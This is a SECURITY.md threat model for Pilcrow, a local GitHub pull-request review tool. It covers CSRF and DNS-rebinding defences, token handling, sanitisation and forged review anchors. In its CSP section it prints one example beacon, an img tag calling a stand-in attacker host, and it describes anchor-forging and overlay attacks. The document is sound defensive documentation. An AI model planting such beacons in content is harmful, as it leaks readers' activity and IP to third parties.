# Security

## Reporting

Please report vulnerabilities privately via [GitHub Security
Advisories](https://github.com/pilcrow-md/pilcrow/security/advisories/new) rather than a public
issue. Expect an acknowledgement within a few days.

## Threat model

Pilcrow runs a local HTTP server that holds a GitHub token with `repo` scope. That makes it a
more interesting target than most localhost tools, and the design reflects it.

**The server is reachable by any page the user has open.** Three checks close the realistic
attacks, in `packages/server/src/middleware/security.ts`:

| Check | Stops |
|---|---|
| `Host` header must be localhost | DNS rebinding, where an attacker domain resolves to 127.0.0.1 |
| `Origin` must be a known origin | ordinary cross-origin reads |
| `X-Pilcrow` must carry this launch's key | CSRF — a `<form>` cannot set custom headers, and a cross-origin `fetch` that tries earns a preflight we fail |

The header value is a random per-launch key, not a constant. Be clear about the limit: a process
running as **you** can read `~/.pilcrow/session` (mode 0600) and use the API. The key stops
drive-by scripts and anything running as another user; it is not a defence against code you have
already run as yourself.

Responses carry `Content-Security-Policy` with `frame-ancestors 'none'` (so the UI, including its
token field, cannot be embedded in another page) and an `img-src` that permits only GitHub-hosted
images. That second one is not cosmetic: an `<img src="https://evil.test/b.png?doc=x">` in a
Markdown file is a read receipt telling its author that a private document was opened, from your
IP, at that moment, with no script involved.

The server binds `127.0.0.1` only, never `0.0.0.0`.

**The token never reaches the browser.** It lives in the macOS Keychain and is attached to
outbound GitHub calls in the server process. API responses carry the login, never the credential.

**Pull request content is untrusted.** Markdown permits raw HTML, and Pilcrow renders Markdown
from arbitrary pull requests inside a page whose origin can reach a token-holding server. Output
is sanitised with DOMPurify before it reaches the DOM.

**Scopes are the minimum GitHub allows.** `repo` and `read:org`. Classic OAuth has no read-only
private-repo scope, and Pilcrow must write review comments, so `repo` is unavoidable rather than
chosen. Users who object can supply a fine-grained token instead.

## Client id and client secret in the repository

Pilcrow may ship an OAuth client id, and optionally a client secret, in source. This is
deliberate and follows GitHub's documented guidance for public clients:

> If your app is a public client (a native app that runs on the user's device, CLI utility, or
> single-page web application), you cannot secure your client secret. You will have to ship the
> client secret in the application's code.

The GitHub CLI and VS Code both do the same in their own source. Note the consequence GitHub
also names: a public client id is trivially reusable, so it can be abused as a device-code
phishing primitive against *other* people. That is why the one-click flow (authorization code +
PKCE, which binds a redirect URI) is preferred over device flow where a browser is available.

Pilcrow never reuses another product's client id.

## The pull request author is a threat, not just the network

Pilcrow renders content written by the person being reviewed, and a review comment is a statement
of record. Two attacks follow from that, and both are defended:

- **Forged anchors.** `data-` attributes survive sanitisation, so a pull request could ship its
  own `data-pilcrow-pos` and steer where your comment landed — you highlight one sentence, the
  comment posted to GitHub quotes another. The position attribute is namespaced with a
  per-render nonce the document cannot predict. `integrity.test.ts` covers both directions.
- **Hidden or overlaid content.** The `style` and `class` attributes are stripped, so a file
  cannot hide text from the rendered view you approve from, nor paint over the interface —
  including the Approve button.

## Unsent comments are stored on disk

Comments you write before submitting are held in `localStorage` so a reload does not throw them
away. That means the text of a draft comment — prose about a pull request that may be private —
sits unencrypted in the browser profile until you submit it or sign out.

Two consequences worth knowing:

- Any code running on the `localhost` origin can read it. That is the same exposure as every
  other dev server on the machine, and the reason Pilcrow's own API requires a per-launch secret.
- Signing out clears every stored draft, deliberately. Removing the token while leaving the
  readable half of the data behind would be a false reassurance.

Nothing else is persisted in the browser. The GitHub token never reaches it.

## Browser extensions

Any extension with content-script access to `localhost` can read what you type into the app and
drive the API. This is a property of shipping a local web UI that holds a `repo` token, not a bug
that can be patched in-page. The CSP does not constrain extensions.

## Contributor note

The anchoring spike caches fetched repository content under `.cache/corpus/`. It is gitignored,
but it is real repository content sitting in your working tree.

## What is not protected

- Anyone with access to your unlocked user account on this machine can use Pilcrow, exactly as
  they could use `gh`.
- A malicious npm dependency runs with your privileges. Viewers are not sandboxed; the default
  set is kept in-repo and reviewed for that reason.
